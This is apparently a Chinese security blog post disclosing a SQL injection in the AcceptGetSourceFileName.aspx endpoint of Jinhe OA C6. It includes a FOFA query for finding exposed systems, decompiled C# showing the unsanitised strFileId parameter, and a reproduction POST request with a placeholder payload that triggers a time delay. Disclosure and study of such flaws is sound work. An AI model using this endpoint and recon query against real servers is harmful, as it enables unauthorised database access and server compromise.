---
title: "金和OA AcceptGetSourceFileName.aspx SQL注入漏洞"
source: https://mrxn.net/jswz/jhsoft-AcceptGetSourceFileName-sqli.html
asset_dir: assets/金和oa-acceptgetsourcefilename.aspx-sql注入漏洞
---

# 金和OA AcceptGetSourceFileName.aspx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/9/7 08:05
* 584浏览
* [0评论](#comment)
* 13分钟阅读

深入探索

SQL

服务器

软件


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `AcceptGetSourceFileName.aspx` 接口处存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

SQL注入检测工具

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

根据 AcceptGetSourceFileName.aspx 的源码，在 bin 目录下查找 JHBase.Web.AcceptAip.dll 将其进行反编译后找到 `AcceptGetSourceFileName` 的处理逻辑

```
public class AcceptGetSourceFileName : Page
{
  protected void Page_Load(object sender, EventArgs e)
  {
    this.Response.Write(Accept.getSourceName(this.Request["strFileId"].ToString(), this.Request["strAppFlag"].ToString()));
  }
```

参数 `strFileId` 和 `strAppFlag` 传入 `Accept.getSourceName` 方法中

跟进 `getSourceName` 方法

深入探索

网络安全培训

编程语言教程

网页浏览器

```
public static string getSourceName(string strFileId, string strAppFlag)
{
  string str = $"select FileName from dbo.Files where FileID='{strFileId}'";
  DataTable dataTable = DBOperatorFactory.GetDBOperator().ExecSQLReDataTable(str);
  return ((InternalDataCollectionBase) dataTable.Rows).Count > 0 ? dataTable.Rows[0][0].ToString() : string.Empty;
}
```

参数 `strFileId` 被直接拼接进SQL语句中后执行，无任何过滤或校验，导致[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
POST /c6/Jhsoft.Web.AcceptAip/AcceptGetSourceFileName.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/x-www-form-urlencoded

strFileId=SQLI_POC&strAppFlag=-1
```

[![金和OA AcceptGetSourceFileName.aspx SQL注入漏洞](images/img-001-3035e92a94a0.webp)](https://image.mrxn.net/7bfe442ee0b64ec690cc4e69028c193b.webp)

成功延时 5 秒

代码安全审计

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[金和OA AcceptGetSourceFileName.aspx SQL注入漏洞](https://mrxn.net/jswz/jhsoft-AcceptGetSourceFileName-sqli.html)  
文章链接：<https://mrxn.net/jswz/jhsoft-AcceptGetSourceFileName-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

漏洞预警服务

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-AcceptGetSourceFileName-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

计算机服务器

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALZklEQVR4Aeyci3LcthJE9+T//9k3o/ahiCGwpORYu1WXqiDNfswQwpDRw0n+eTwev76zfrWP3qPZG+05uYHO1UX9GfbMinfdXuodv+qb/w7WQP6tu/96lxPYBvLvU/G4slYbt1YfeADSA/b8IfBbAD76QLDXyQshmd+lXwZIPYzYG8Fz33zt6coyX7gNpMi9Xn8Ch4HAOH0IP9sqJOcTYR6iQ1D9DOF53vtAcsCyZc8aVJefIfDxtn63DlIPwdn9DgOZhW7t507grw/Ep0n0U4M8JV3v3Lw6pK7r+oV6Iow1Xa+aWup1XUt+hpWtdZa74v/1gVzZxJ35PIE/Hgjk6asnpBbMOYx6ZWtBdBjRLVamFsRXh3A4opkVQmqqby0IX+VXetXWWvnf0f94IN+56V2zPoHDQGris7VqYVb/g//69fHdCHD42cYczJ9K682t0NwMrYHcY5YpDeKbFyF6ZWYL4ps/w1mP0mZ1h4HMQrf2cyewDQQydXiOfWuQvDqE1xNQC8JXvnpla0HydV0LRm5ehPiA0oZVXwv4eGM1ILy8Wup1XUsuQvLyjjD3ITo8x32/bSB78b5+3Qn8U0/Ed1bfMuQp6LocRh/Cvbe5M25ONF+oJkLuIe8Iow/h1auW+bquBfHVxfJqdV7aV9f9hniKb4KHgUCeAgj2fUJ0COr7JMghvrqoL4fk1EWIDkF1EaLDEc2coXvoOUjPrpsXYcxBOASth5Grz/AwkFno1n7uBP6BcXpOX+xb6boc0kcuntXrQ+rlon0gvlw0N8OzDIw97WEdxIcRe05+FSH9Zvn7DZmdygu1bSCQqcE1dM+QfH+q9EVIDkbU7/WdPx6PjyjM68u0RoRky6sFI++5zqumlroI6QMjVna/IP5eq2v71HVf20C6cfPXnMA2kD61FV/pkKdBH8L9tNRXCMnrw8jVRfs+w56Vi9Z2fqbrd1z1MQf5nCA407eBaN742hO4PBDIVCHo0wDh/dPQV4fkINh18xC/c4gOQetnCGOm97IGxpz6Kt99+Rna7yxX/uWBVPhef/8EtoFAnhanCeF9C92Xi/C8rvdbcUgf+15Be5mF9ICgurmrCKk3D+H2E/U7V+8I6bPXt4Hsxfv6dSdw+G2vW+lTlsM4VRi5OftAfAiqn6F94HkdxIcj2qPfC5JVh3AYUV+E+Gd9ITnrROue4f2GeFpvgttAIFOFYN8fRHe6+nKIrw7h+upyiK8O1ziMOfvt0Z4dYVL769fyz/33PevafpA+MGJlapmr61qQnDrMOfDYBvK4P97iBLaB1CRruSsYp9j1ytZSF2Gsgzmv2lrWrbAytVb+TK98LRjvXdp+wejPeu21fW1d69V1rc5h3r+ytXq+tG0gmje+9gS2Pw+BTLOmtF99e3qQPATVRevkovpVhHl/iD7rA/G8p9izXYexDsJ7HUS3HsJ7Tr/rnUPqgftryOPNPg7/yIJMy332KUN8ddH8CiF13V/Vr/ReD+kLn2gtROs1f8rtbx855H4wojmIvuKlHwZS4r1edwKHn9T7tN2augiZNgTNQXjPyc2JMOa7Lv8KQnpaAyPvOsR3jzDnEN36FdpHv3P1Gd5vyOxUXqgdvsuC8SmAOT+bOqSu5+Qw+hC+OguID8FZzt56clFdVBfVRci99EWIbk7UfzweH1LnH+LJ3+435OSAftreBuI0RTcihzwV8pXfdTmkXi7CqNtfNLfi6oUw9rIWnusw+tWr1qq+vFr6IqQPBNXFqqnVeWmubSCGbnztCWzfZUGmCkG3BXMO0SHohHsdjD6M3LwI8eUrhOTgE1dZ9wbJmlOXi5CcvqgvQnIQVBchOoyoP8P7DZmdygu1bSA+BR3dW9fl+mLX5ZCnxByE63c0J0Ly8p7fczOQGgiagXBz6vKOkDyM2OvkHVf91OGz7zYQzRtfewLbQCBTOtsOPM/B6EN4f2rk3g+Sg6C62PPqkDygtKE1IvDx3xrKt+DiApLX/m7dqh7S376F20AsuvG1J3AP5LXnf7j79quTg/N4PGZavVa1ugfH12+fg/jWQTgEK7tf5kRITi5+p8ZaSE8Y0Z7mVgip6/6qHsb8LHe/If00X8y3HwydFoxTdH8QHUbUFyG+XLS/XOw6pB6CV3OQPGDJAfu9DKiLXZcDH98UyHse4sOI5q/g/YZcOaUfzBy+hjh1yJTl7kneUX+FkH761su/irP6rskh94ag99KXw+hDeM91br3YfXlHSH/4xPsN8RTfBLevIfA5Jfj83yr1fcKY675PQdc7h/RRh5H3PhC/69YXwjxjjQjJQbBq9wuim9eTQ/yuyyH+Km9ONFd4vyGeypvg5YHU9PbL/UOehs4h+r6mrs3VdS0Yc/oQXS5CdAhWD9cq0/VV3pwIuYdc7PVnur4I6WsfCAfuf1Hu8WYf2xvitM72B5mmOevErsvBOpURYfTt13Gs+hqz19eqztOQvUPwvCIJOOa3gSRy//3VJ7ANBI7T2m8O4vuUiWYgfucw6vpnCM/rvD8kB+ffGXpPSI091M8QUmcORt77QXx1GLn6HreBeJMbX3sCh5/U3Q5kmhDsuvwMnb45GPt135w6XMtXHSRrrVheLRj90q4sSJ1ZCLe/qN85jHlzM7zfkNmpvFDbflLvU+170hchUzenLqqLK737PSeH8X6ruspDshDsWXnHqn22zJuB9IcRzYlfyd9viKf2Jnj4GuI0O7pfyNOgD+EQNLdC6/RhrINwGNF8R/jM6XkPUb0jpNYchEPQPISbU/8q73W9vvz7DalTeKO1fQ1xT5CnAYLq4myq5alD6uTl7RfEh6A5GPm+Zn8NyalZX6gmwphVF6umllwsrRakvq5r6UN0CJZXq/udV6YWpA6C5grvN6RO4Y3WNhA4Tmu/T4gPwb03u4bnuXpSavVaSF15s7XKQ+qAHtn+1xnA8Gfih+BvAZLz/hD+2z4AjL51BuUw5vQhOnD/tvfxZh/bG9L35VSv6uZ6HWT6Z751onkY67tufo9m1GDsAeEwonUdex+5uc7VYexvrqP5wuVAyrzXz5/AYSBOb7UVmE/dPMSX2w+iQ7D7cogPQfWO9t3rMK8x29Hala6/Quv0Yby/vgjxYUT9wsNAbH7ja07gMBAYp+e2anr7pS5C6sx0Xa4PycOI5jpCcl3f89577+2vYewF4RC0z76mrld6ebW6D+lX3n6ZE/feYSB7877++RM4/C7LLcymVx6MU4fwnpeLVbtfZ7p+R3tA7gtHPMvY09waRwfGe+nCqEN49+XP8H5Dnp3OC7ztd1k+NeJqL/piz8H4dOibh/gQVBfNQ3wIqovmZ2jmDK01J4fcE4L6Ys91XV/UF2HsC+HA/ZP6480+tq8h8DklOL/unwekRh3CYUR9nx4YfQg3J8JzHTD6ZXQvFspFYPo7MH3rRJjn9a2DY+7+GuIpvQluA3FqZ9j33fP6K12/Y8/Le65zc4XdW3HIkwlBcxAOI+pfxdpLrav5fW4byF68r193AoeBwPh0QPjZFuFabtUHxnoIryetVq+D+HBEs1W3X+qiXudnOuSe1okQHUbUv4KHgVwpujN/7wT+eCCQp8Et9qdLXdSH1MlFcx1Xvvoeey3M7wXRYcReL4fkvBeM3JxornO5aK7wjwdi0xv/mxP4zwZS060FeWrcHoxcvbK1ID6MaA6iy6tmv9S/gvC8J8T3PvbuXB2Sl5uDUdd/hv/ZQJ7d5Paun8BhIE6346qlua